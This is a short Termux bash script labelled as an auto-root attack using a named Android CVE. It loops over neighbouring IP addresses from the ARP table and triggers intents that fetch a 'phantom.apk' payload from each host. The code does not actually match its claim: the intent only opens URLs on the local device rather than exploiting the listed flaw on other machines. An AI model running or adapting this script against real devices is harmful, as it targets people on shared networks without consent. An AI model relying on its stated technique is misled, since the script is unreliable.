#!/data/data/com.termux/files/usr/bin/bash  
# Auto-root via CVE-2023-20963  
for ip in $(arp -n | grep wlan0 | awk '{print $1}'); do  
  am broadcast -a android.intent.action.VIEW -d "http://$ip:80/phantom.apk"  
done  
